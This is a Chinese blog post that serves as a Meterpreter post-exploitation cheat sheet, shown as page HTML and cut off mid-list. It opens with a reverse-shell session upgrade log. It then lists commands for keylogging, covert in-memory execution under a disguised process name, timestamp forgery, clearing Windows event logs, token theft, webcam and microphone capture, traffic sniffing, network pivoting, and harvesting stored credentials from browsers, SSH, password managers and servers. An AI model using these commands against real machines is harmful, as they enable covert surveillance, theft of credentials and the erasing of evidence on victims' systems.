<!doctype html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="metasploit,meterpreter,pentest," />





  <link rel="alternate" href="/atom.xml" title="Myths" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/logo.jpg?v=5.1.1" />






<meta name="description" content="低级 shell 升级到 meterpreter12345678910111213msf5 exploit(multi/handler) &amp;gt; use post/multi/manage/shell_to_meterpretermsf5 post(multi/manage/shell_to_meterpreter) &amp;gt; set SESSION 1SESSION =&amp;gt; 1msf5 p">
<meta property="og:type" content="article">
<meta property="og:title" content="meterpreter">
<meta property="og:url" content="http://myt0.com/2020/03/06/meterpreter/index.html">
<meta property="og:site_name" content="Myths">
<meta property="og:description" content="低级 shell 升级到 meterpreter12345678910111213msf5 exploit(multi/handler) &amp;gt; use post/multi/manage/shell_to_meterpretermsf5 post(multi/manage/shell_to_meterpreter) &amp;gt; set SESSION 1SESSION =&amp;gt; 1msf5 p">
<meta property="og:updated_time" content="2020-03-06T05:56:26.919Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="meterpreter">
<meta name="twitter:description" content="低级 shell 升级到 meterpreter12345678910111213msf5 exploit(multi/handler) &amp;gt; use post/multi/manage/shell_to_meterpretermsf5 post(multi/manage/shell_to_meterpreter) &amp;gt; set SESSION 1SESSION =&amp;gt; 1msf5 p">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://myt0.com/2020/03/06/meterpreter/"/>





  <title>meterpreter | Myths</title>
  














</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Myths</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Myt0's blog</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://myt0.com/2020/03/06/meterpreter/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Myths">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Myths">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">meterpreter</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-06T13:49:03+08:00">
                2020-03-06
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2020-03-06T13:56:26+08:00">
                2020-03-06
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/tools/" itemprop="url" rel="index">
                    <span itemprop="name">tools</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="低级-shell-升级到-meterpreter"><a href="#低级-shell-升级到-meterpreter" class="headerlink" title="低级 shell 升级到 meterpreter"></a>低级 shell 升级到 meterpreter</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use post/multi/manage/shell_to_meterpreter</span><br><span class="line">msf5 post(multi/manage/shell_to_meterpreter) &gt; <span class="built_in">set</span> SESSION 1</span><br><span class="line">SESSION =&gt; 1</span><br><span class="line">msf5 post(multi/manage/shell_to_meterpreter) &gt; run</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[*] Upgrading session ID: 1</span><br><span class="line">[*] Starting exploit/multi/handler</span><br><span class="line">[*] Started reverse TCP handler on 192.168.99.103:4433</span><br><span class="line">[*] Sending stage (985320 bytes) to 192.168.99.101</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.99.103:4433 -&gt; 192.168.99.101:59582) at 2020-02-24 17:00:18 +0800</span><br><span class="line">[*] Command stager progress: 100.00% (773/773 bytes)</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure>
<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">background   <span class="comment"># 将当前会话放置后台</span></span><br><span class="line">sessions   <span class="comment"># sessions –h 查看帮助</span></span><br><span class="line">sessions -i &lt;ID值&gt;  <span class="comment">#进入会话   -k  杀死会话</span></span><br><span class="line">bgrun / run   <span class="comment"># 执行已有的模块，输入run后按两下tab，列出已有的脚本</span></span><br><span class="line">info   <span class="comment"># 查看已有模块信息</span></span><br><span class="line">getuid   <span class="comment"># 查看当前用户身份</span></span><br><span class="line">getprivs  <span class="comment"># 查看当前用户具备的权限</span></span><br><span class="line">getpid   <span class="comment"># 获取当前进程ID(PID)</span></span><br><span class="line">getenv <span class="variable">$PATH</span> <span class="comment"># 查看环境变量</span></span><br><span class="line">sysinfo   <span class="comment"># 查看目标机系统信息</span></span><br><span class="line">irb   <span class="comment"># 开启ruby终端</span></span><br><span class="line">ps   <span class="comment"># 查看正在运行的进程</span></span><br><span class="line"><span class="built_in">kill</span> &lt;PID值&gt; <span class="comment"># 杀死指定PID进程</span></span><br><span class="line">idletime     <span class="comment"># 查看目标机闲置时间</span></span><br><span class="line">reboot / shutdown    <span class="comment"># 重启/关机</span></span><br><span class="line">shell    <span class="comment"># 进入目标机cmd shell</span></span><br></pre></td></tr></table></figure>
<h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig  <span class="comment"># 查看网络接口信息</span></span><br><span class="line">netstat –ano  <span class="comment"># 查看网络连接状态</span></span><br><span class="line">arp  <span class="comment"># 查看arp缓冲表</span></span><br><span class="line">getproxy   <span class="comment"># 查看代理信息</span></span><br><span class="line">route   <span class="comment"># 查看路由表信息</span></span><br></pre></td></tr></table></figure>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ls  <span class="comment"># 列出当前目录中的文件列表</span></span><br><span class="line"><span class="built_in">cd</span>  <span class="comment"># 进入指定目录</span></span><br><span class="line">getwd / <span class="built_in">pwd</span>  <span class="comment"># 查看当前工作目录</span></span><br><span class="line">search <span class="_">-d</span> c:\\ <span class="_">-f</span> *.txt  <span class="comment"># 搜索文件  -d 目录 -f 文件名</span></span><br><span class="line">cat c:\\123.txt  <span class="comment"># 查看文件内容</span></span><br><span class="line">upload /tmp/hack.txt C:\\  <span class="comment"># 上传文件到目标机上</span></span><br><span class="line">download c:\\123.txt /tmp/  <span class="comment"># 下载文件到本机上</span></span><br><span class="line">edit c:\\test.txt  <span class="comment"># 编辑或创建文件  没有的话，会新建文件</span></span><br><span class="line">rm C:\\hack.txt  <span class="comment"># 删除文件</span></span><br><span class="line">mkdir admin  <span class="comment"># 只能在当前目录下创建文件夹</span></span><br><span class="line">rmdir admin  <span class="comment"># 只能删除当前目录下文件夹</span></span><br><span class="line">getlwd / lpwd  <span class="comment"># 查看本地当前目录</span></span><br><span class="line">lcd /tmp  <span class="comment"># 切换本地目录</span></span><br></pre></td></tr></table></figure>
<h2 id="键盘鼠标"><a href="#键盘鼠标" class="headerlink" title="键盘鼠标"></a>键盘鼠标</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uictl开关键盘/鼠标</span><br><span class="line">uictl [<span class="built_in">enable</span>/<span class="built_in">disable</span>] [keyboard/mouse/all]  <span class="comment"># 开启或禁止键盘/鼠标</span></span><br><span class="line">uictl <span class="built_in">disable</span> mouse  <span class="comment"># 禁用鼠标</span></span><br><span class="line">uictl <span class="built_in">disable</span> keyboard  <span class="comment"># 禁用键盘</span></span><br></pre></td></tr></table></figure>
<h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start  <span class="comment"># 开始键盘记录</span></span><br><span class="line">keyscan_dump   <span class="comment"># 导出记录数据</span></span><br><span class="line">keyscan_stop   <span class="comment"># 结束键盘记录</span></span><br></pre></td></tr></table></figure>
<h2 id="执行文件"><a href="#执行文件" class="headerlink" title="执行文件"></a>执行文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">execute <span class="comment">#在目标机中执行文件</span></span><br><span class="line">execute -H -i <span class="_">-f</span>  cmd.exe <span class="comment"># 创建新进程cmd.exe，-H不可见，-i交互</span></span><br><span class="line">execute -H -m <span class="_">-d</span> notepad.exe <span class="_">-f</span> payload.exe <span class="_">-a</span> <span class="string">"-o hack.txt"</span></span><br><span class="line"><span class="comment"># -d 在目标主机执行时显示的进程名称（用以伪装）-m 直接从内存中执行</span></span><br><span class="line"><span class="string">"-o hack.txt"</span>是payload.exe的运行参数</span><br><span class="line">execute <span class="_">-f</span> bash -i <span class="comment"># 创建bash shell进行交互</span></span><br></pre></td></tr></table></figure>
<h2 id="timestomp-伪造时间戳"><a href="#timestomp-伪造时间戳" class="headerlink" title="timestomp 伪造时间戳"></a>timestomp 伪造时间戳</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:\\ -h   <span class="comment">#查看帮助</span></span><br><span class="line">timestomp -v C:\\2.txt   <span class="comment">#查看时间戳</span></span><br><span class="line">timestomp C:\\2.txt <span class="_">-f</span> C:\\1.txt <span class="comment">#将1.txt的时间戳复制给2.txt</span></span><br><span class="line">timestomp  c:\\<span class="built_in">test</span>\\22.txt -z <span class="string">"03/10/2019 11:55:55"</span> -v <span class="comment"># 把四个属性设置为统一时间</span></span><br></pre></td></tr></table></figure>
<h2 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">migrate进程迁移</span><br><span class="line">getpid    <span class="comment"># 获取当前进程的pid</span></span><br><span class="line">ps   <span class="comment"># 查看当前活跃进程</span></span><br><span class="line">migrate &lt;pid值&gt;    <span class="comment"># windows 将Meterpreter会话移植到指定pid值进程中</span></span><br><span class="line"><span class="built_in">kill</span> &lt;pid值&gt;   <span class="comment"># 杀死进程</span></span><br></pre></td></tr></table></figure>
<h2 id="portfwd-端口转发"><a href="#portfwd-端口转发" class="headerlink" title="portfwd 端口转发"></a>portfwd 端口转发</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">portfwd add <span class="_">-l</span> 1111 -p 3389 -r 127.0.0.1 <span class="comment">#将目标机的3389端口转发到本地1111端口</span></span><br><span class="line">rdesktop 127.0.0.1:1111 <span class="comment"># 需要输入用户名密码连接</span></span><br><span class="line">rdesktop -u Administrator -p 123 127.0.0.1:1111 <span class="comment"># -u 用户名 -p 密码</span></span><br></pre></td></tr></table></figure>
<h2 id="sniffer-抓包"><a href="#sniffer-抓包" class="headerlink" title="sniffer 抓包"></a>sniffer 抓包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   <span class="comment"># 查看网卡</span></span><br><span class="line">sniffer_start 1   <span class="comment"># 选择网卡1开始抓包</span></span><br><span class="line">sniffer_stats 1   <span class="comment"># 查看网卡1状态</span></span><br><span class="line">sniffer_dump 1 /tmp/wlan1.pcap  <span class="comment"># 导出pcap数据包</span></span><br><span class="line">sniffer_stop 1   <span class="comment"># 停止网卡1抓包</span></span><br><span class="line">sniffer_release 1 <span class="comment"># 释放网卡1流量</span></span><br></pre></td></tr></table></figure>
<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;pid值&gt;   <span class="comment"># 从指定进程中窃取token</span></span><br><span class="line">drop_token  <span class="comment"># 停止假冒当前的token</span></span><br></pre></td></tr></table></figure>
<h2 id="网络摄像头"><a href="#网络摄像头" class="headerlink" title="网络摄像头"></a>网络摄像头</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">record_mic　 <span class="comment"># 音频录制</span></span><br><span class="line">webcam_chat  <span class="comment"># 开启视频聊天(对方有弹窗）</span></span><br><span class="line">webcam_list  <span class="comment"># 查看摄像头</span></span><br><span class="line">webcam_snap  <span class="comment"># 通过摄像头拍照</span></span><br><span class="line">webcam_stream  <span class="comment"># 通过摄像头开启视频监控(以网页形式进行监控≈直播）</span></span><br></pre></td></tr></table></figure>
<h2 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">screenshot  <span class="comment"># 截屏</span></span><br><span class="line">use espia  <span class="comment"># 使用espia模块</span></span><br><span class="line">screengrab  <span class="comment"># 截屏</span></span><br></pre></td></tr></table></figure>
<h2 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearav  <span class="comment"># 清除windows中的应用程序日志、系统日志、安全日志</span></span><br></pre></td></tr></table></figure>
<h1 id="后渗透脚本"><a href="#后渗透脚本" class="headerlink" title="后渗透脚本"></a>后渗透脚本</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run -h</span><br><span class="line">Usage: run &lt;script&gt; [arguments]</span><br><span class="line"></span><br><span class="line">Executes a ruby script or Metasploit Post module <span class="keyword">in</span> the context of the</span><br><span class="line">meterpreter session.  Post modules can take arguments <span class="keyword">in</span> var=val format.</span><br><span class="line">Example: run post/foo/bar BAZ=abcd</span><br><span class="line"></span><br><span class="line"><span class="comment"># run tab两下展示当前meterpreter所有可用脚本</span></span><br><span class="line">meterpreter &gt; run</span><br></pre></td></tr></table></figure>
<h2 id="添加路由，横向渗透"><a href="#添加路由，横向渗透" class="headerlink" title="添加路由，横向渗透"></a>添加路由，横向渗透</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Usage:   run autoroute [-r] <span class="_">-s</span> subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute <span class="_">-s</span> 10.1.1.0 -n 255.255.255.0  <span class="comment"># Add a route to 10.10.10.1/255.255.255.0</span></span><br><span class="line">[*]   run autoroute <span class="_">-s</span> 10.10.10.1                 <span class="comment"># Netmask defaults to 255.255.255.0</span></span><br><span class="line">[*]   run autoroute <span class="_">-s</span> 10.10.10.1/24              <span class="comment"># CIDR notation is also okay</span></span><br><span class="line">[*]   run autoroute -p                            <span class="comment"># Print active routing table</span></span><br><span class="line">[*]   run autoroute <span class="_">-d</span> <span class="_">-s</span> 10.10.10.1              <span class="comment"># Deletes the 10.10.10.1/255.255.255.0 route</span></span><br><span class="line">[*] Use the <span class="string">"route"</span> and <span class="string">"ipconfig"</span> Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module</span><br></pre></td></tr></table></figure>
<p>Socks 代理<br>可参考：<a href="https://www.freebuf.com/articles/network/125278.html" target="_blank" rel="external">https://www.freebuf.com/articles/network/125278.html</a><br>只有在目标设备添加完路由后才可以通过 msf 自带的 socks4a 模块进行 socks4 代理转发</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line"><span class="built_in">set</span> srvhost 127.0.0.1</span><br><span class="line"><span class="built_in">set</span> srvport 2000</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h2 id="各平台通用"><a href="#各平台通用" class="headerlink" title="各平台通用"></a>各平台通用</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用Metasploit &lt; 4.4版本的'pcap_log'插件提权</span></span><br><span class="line">run post/multi/escalate/metasploit_pcaplog</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试查找本地提权漏洞</span></span><br><span class="line">run post/multi/recon/<span class="built_in">local</span>_exploit_suggester</span><br></pre></td></tr></table></figure>
<h3 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 收集所有用户ssh凭证</span></span><br><span class="line">run post/multi/gather/ssh_creds</span><br><span class="line"><span class="comment"># 通过 VirusTotal 检查某个文件是不是恶意文件</span></span><br><span class="line">run post/multi/gather/check_malware REMOTEFILE=/var/www/html/phpinfo.php</span><br><span class="line"><span class="comment"># 收集 Mozilla Thunderbird 下载文件的凭证</span></span><br><span class="line">run post/multi/gather/thunderbird_creds</span><br><span class="line"><span class="comment"># 收集 chrome cookies</span></span><br><span class="line">run post/multi/gather/chrome_cookies</span><br><span class="line"><span class="comment"># 收集 tomcat 敏感信息</span></span><br><span class="line">run post/multi/gather/tomcat_gather</span><br><span class="line"><span class="comment"># 收集 DbVisualizer 的 dbvis.xml 记录的敏感信息</span></span><br><span class="line">run post/multi/gather/dbvis_enum</span><br><span class="line"><span class="comment"># 收集 Ubiquiti UniFi 敏感信息</span></span><br><span class="line">run post/multi/gather/ubiquiti_unifi_backup</span><br><span class="line"><span class="comment"># 根据字典枚举子域名</span></span><br><span class="line">run post/multi/gather/dns_bruteforce DOMAIN=myt0.com NAMELIST=wordlist</span><br><span class="line"><span class="comment"># 收集可用的无线网，通过访问google查询物理地址</span></span><br><span class="line">run post/multi/gather/wlan_geolocate</span><br><span class="line"><span class="comment"># dns反查</span></span><br><span class="line">run post/multi/gather/dns_reverse_lookup</span><br><span class="line"><span class="comment"># 关闭指定session，用于收尾工作</span></span><br><span class="line">run post/multi/general/close</span><br><span class="line"><span class="comment"># 收集域名SRV记录</span></span><br><span class="line">run post/multi/gather/dns_srv_lookup</span><br><span class="line"><span class="comment"># 执行任意命令</span></span><br><span class="line">run post/multi/general/execute COMMAND=id</span><br><span class="line"><span class="comment"># 查找所有VirtualBox虚拟机</span></span><br><span class="line">run post/multi/gather/enum_vbox</span><br><span class="line"><span class="comment"># 通过wall或者write发送信息给指定用户</span></span><br><span class="line">run post/multi/general/wall USERS= MESSAGE=</span><br><span class="line"><span class="comment"># 输出系统环境变量</span></span><br><span class="line">run post/multi/gather/env</span><br><span class="line"><span class="comment"># 收集 FileZilla FTP 客户端凭证信息</span></span><br><span class="line">run post/multi/gather/filezilla_client_cred</span><br><span class="line"><span class="comment"># 查找所有VMWare 虚拟机</span></span><br><span class="line">run post/multi/gather/find_vmx</span><br><span class="line"><span class="comment"># 收集firefox凭证</span></span><br><span class="line">run post/multi/gather/firefox_creds</span><br><span class="line"><span class="comment"># 收集所有用户 .gnupg 目录下的凭证信息</span></span><br><span class="line">run post/multi/gather/gpg_creds</span><br><span class="line"><span class="comment"># 从 GRUB bootloader 配置文件收集 GRUB 密码</span></span><br><span class="line">run post/multi/gather/grub_creds</span><br><span class="line"><span class="comment"># 收集jboss管理员密码，适用版本4,5,6</span></span><br><span class="line">run post/multi/gather/jboss_gather</span><br><span class="line"><span class="comment"># 收集jenkins密码</span></span><br><span class="line">run post/multi/gather/jenkins_gather</span><br><span class="line"><span class="comment"># 收集LastPass凭证信息</span></span><br><span class="line">run post/multi/gather/lastpass_creds</span><br><span class="line"><span class="comment"># 从一个文件中读取shell命令并执行</span></span><br><span class="line">run post/multi/gather/multi_<span class="built_in">command</span> REOURCE=cmd.txt</span><br><span class="line"><span class="comment"># 收集所有用户 settings.xml</span></span><br><span class="line">run post/multi/gather/maven_creds</span><br><span class="line"><span class="comment"># 收集 Pidgin IM 客户端凭证</span></span><br><span class="line">run post/multi/gather/pidgin_cred</span><br><span class="line"><span class="comment"># 使用目标机器ping命令扫描</span></span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.99.1/24</span><br><span class="line"><span class="comment"># 收集 Remmina 记录的RDP，VNC凭证</span></span><br><span class="line">run post/multi/gather/remmina_creds</span><br><span class="line"><span class="comment"># 收集 .pgpass or pgpass.conf 中的凭证</span></span><br><span class="line">run post/multi/gather/pgpass_creds</span><br></pre></td></tr></table></figure>
<h3 id="Manage"><a href="#Manage" class="headerlink" title="Manage"></a>Manage</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用Dbvisulaizer命令行执行shell增加一个数据库用户，目前只支持mysql</span></span><br><span class="line">run post/multi/manage/dbvis_add_db_admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用Dbvisulaizer命令行查询数据库</span></span><br><span class="line">run post/multi/manage/dbvis_query QUERY=</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除浏览器中HSTS数据库</span></span><br><span class="line">run post/multi/manage/hsts_eraser</span><br><span 